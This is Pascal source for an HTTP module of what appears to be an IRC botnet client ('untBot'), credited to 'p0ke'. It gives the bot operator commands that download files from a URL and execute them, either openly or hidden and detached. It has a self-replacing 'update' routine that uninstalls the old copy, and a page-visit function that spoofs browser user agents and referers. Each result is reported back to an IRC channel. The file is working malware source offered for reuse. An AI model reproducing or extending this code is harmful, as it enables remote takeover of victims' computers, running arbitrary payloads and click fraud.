(*
  HTTP Support.
  This pas was written by p0ke.
  If you use it, make sure to credit where credit is due.

  This procedure can download, update, execute and visit pages.
  Coded in pure winsock api.
*)

unit untHTTPa;

interface

Uses
  Windows, Winsock, untFunctions, ShellApi;

  Function  VisitPage(Host, Referer: String; Mozilla: Bool): Bool;
  Procedure DownloadFileFromURL(dHost: String; dTo: String);
  Procedure ExecuteFileFromURL(dHost: String; dTo: String);
  Procedure UpdateFileFromURL(dHost: String; dTo: String);

implementation

Uses
  untBot;

Function CreateGet(Host, SubHost, Referer: String; Mozilla: Bool): String; 
Begin
  If (Not Mozilla) Then
    Result := 'GET /'+SubHost+' HTTP/1.1'#13#10+
              'Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*'#13#10+
              'Referer: '+Referer+#13#10+
              'Accept-Language: en-us'#13#10+
              'Accept-Encoding: gzip, deflate'#13#10+
              'User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)'#13#10+
              'Connection: Keep-Alive'#13#10+
              'Host: '+Host+#13#10#13#10;
  If (Mozilla) Then
    Result := 'GET /'+SubHost+' HTTP/1.1'#13#10+
              'Host: '+Host+#13#10+
              'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.6) Gecko/20050317 Firefox/1.0.2'#13#10+
              'Accept: text/xml, application/xml, application/xhtml+xml, text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'#13#10+
              'Accept-Language: en-us,en;q=0.5'#13#10+
              'Accept-Encoding: gzip,deflate'#13#10+
              'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7'#13#10+
              'Keep-Alive: 300'#13#10+
              'Connection: Keep-Alive'#13#10+
              'Referer: '+Referer+#13#10#13#10;
End;

Function HTTPReceive(Sock: TSocket): Integer;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 120;
  TimeOut.tv_usec :=  0;

  FD_ZERO(FD_STRUCT);
  FD_SET (Sock, FD_STRUCT);

  IF (Select(0, @FD_STRUCT, NIL, NIL, @TIMEOUT) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := -1;
    Exit;
  End;
  Result := 0;
End;

Function DownloadFile(Host, dTo: String; VAR dTotal, dSpeed: String): Bool;
Var
  Web           :TSocket;
  WSA           :TWSAdata;
  Add           :TSockAddrIn;

  Buffer        :Array[0..15036] Of Char;
  SubHost       :String;
  Buf           :String;

  Size          :Integer;
  rSize         :Integer;

  F             :File Of Char;

  Start         :Integer;
  Total         :Integer;
  Speed         :Integer;
Begin
  If (Host = '') Then Exit;
  If (Host[Length(Host)] = '/') Then Delete(Host, Length(Host), 1);
  If (LowerCase(Copy(Host, 1, 4)) = 'http') Then Delete(Host, 1, 7);
  If (Pos('/', Host) > 0) Then
  Begin
    SubHost := Copy(Host, Pos('/', Host)+1, Length(Host));
    Host := Copy(Host, 1, Pos('/', Host)-1);
  End Else
    SubHost := '';

  WSAStartUP(MakeWord(2,1), WSA);
    Web := Socket(AF_INET, SOCK_STREAM, 0);
    If (Web > INVALID_SOCKET) Then
    Begin
      Add.sin_family := AF_INET;
      Add.sin_port := hTons(80);
      Add.sin_addr.S_addr := inet_addr(pChar(ResolveIP(Host)));

      If (Connect(Web, Add, SizeOf(Add)) = ERROR_SUCCESS) Then
      Begin
        Buf := CreateGet(Host, SubHost, '', FALSE);
        Send(Web, Buf[1], Length(Buf), 0);

        Recv(Web, Buffer, 5012, 0);
        Buf := String(Buffer);
        Delete(Buf, 1, Pos('Content-Length', Buf)+15);
        Delete(Buf, Pos(#13, Buf), Length(Buf));

        Size := StrToInt(Buf);

        Total := 1;
        Start := GetTickCount;

        AssignFile(F, dTo);
        ReWrite(F);
        Repeat
          If (HTTPReceive(WEB) = 0) Then
          Begin
            rSize := Recv(Web, Buffer, SizeOf(Buffer), 0);
            Total := Total + rSize;
            If (rSize > 0) Then
              BlockWrite(F, Buffer, rSize);
            Dec(Size, rSize);
          End Else
            Break;
        Until Size = 0;
        CloseFile(F);

        Speed := Total DIV (((GetTickCount() - Start) DIV 1000) + 1);

        dTotal := GetKBS(Total);
        dSpeed := GetKBS(Speed);

        If (Size <= 0) Then
          Result := True
        Else
          Result := False;
      End;

    End;
    CloseSocket(Web);
  WSACleanUP();
End;

Procedure ExecuteFileFromURL(dHost: String; dTo: String);
Var
  Total :String;
  Speed :String;
Begin
  BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloading File ('+dHost+')'#10, FALSE, BOT.IRC.Sock);
  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s'#10, FALSE, BOT.IRC.Sock);

    ShellExecute(0, 'open', pChar(dTo), nil, nil, 1);
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Opened '+dTo+#10, FALSE, BOT.IRC.Sock)
  End Else
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Download Failed'#10, FALSE, BOT.IRC.Sock);
End;

Procedure UpdateFileFromURL(dHost: String; dTo: String);
Var
  Total :String;
  Speed :String;
  pInfo :PROCESS_INFORMATION;
  sInfo :STARTUPINFO;
Begin
  BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloading Update ('+dHost+')'#10, FALSE, BOT.IRC.Sock);
  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s'#10, FALSE, BOT.IRC.Sock);

    FillChar(sInfo, SizeOf(STARTUPINFO), 0);
    sInfo.cb := SizeOf(sInfo);
    sInfo.wShowWindow := SW_HIDE;

    If (CreateProcess(NIL, pChar(dTo), NIL, NIL, FALSE, NORMAL_PRIORITY_CLASS OR DETACHED_PROCESS, NIL, NIL, sINFO, pINFO) = True) Then
    Begin
      BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Opened '+dTo+#10, FALSE, BOT.IRC.Sock);
      DoUninstall;
      WSACleanUP;
      ExitProcess(0);
    End;
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Failed To Open '+dTo+#10, FALSE, BOT.IRC.Sock);
  End Else
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Download Failed'#10, FALSE, BOT.IRC.Sock);
End;

Procedure DownloadFileFromURL(dHost: String; dTo: String);
Var
  Total :String;
  Speed :String;
Begin
  BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloading File ('+dHost+')'#10, FALSE, BOT.IRC.Sock);
  If (DownloadFile(dHost, dTo, Total, Speed)) Then
  Begin
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Downloaded '+Total+' to '+dTo+' in '+Speed+'/s'#10, FALSE, BOT.IRC.Sock);
  End Else
    BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Download Failed'#10, FALSE, BOT.IRC.Sock);
End;

Function VisitPage(Host, Referer: String; Mozilla: Bool): Bool;
Var
  Web   :TSocket;
  Wsa   :TWSAData;
  Add   :TSockAddrIn;

  SubHost: String;
  Buf   :String;
Begin
  If (Host = '') Then Exit;
  If (Host[Length(Host)] = '/') Then Delete(Host, Length(Host), 1);
  If (Copy(Host, 1, 4) = 'http') Then Delete(Host, 1, 7);
  If (Pos('/', Host) > 0) Then
  Begin
    SubHost := Copy(Host, Pos('/', Host)+1, Length(Host));
    Host := Copy(Host, 1, Pos('/', Host)-1);
  End Else
    SubHost := '';

  WSAStartUP(MakeWord(2,1), WSA);
    Web := Socket(AF_INET, SOCK_STREAM, 0);
    If (Web > INVALID_SOCKET) Then
    Begin
      Add.sin_family := AF_INET;
      Add.sin_port := hTons(80);
      Add.sin_addr.S_addr := inet_addr(pChar(ResolveIP(Host)));

      If (Connect(Web, Add, SizeOf(Add)) = ERROR_SUCCESS) Then
      Begin
        Result := True;
        Buf := CreateGet(Host, SubHost, Referer, Mozilla);
        Send(Web, Buf[1], Length(Buf), 0);
        BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Visit Successfull'#10, FALSE, BOT.IRC.Sock);
      End Else
        BOT.SendData('PRIVMSG '+BOT.Channel+' :[HTTP] Visit Failed'#10, FALSE, BOT.IRC.Sock);

    End;
    CloseSocket(Web);
  WSACleanUP();
End;

end.
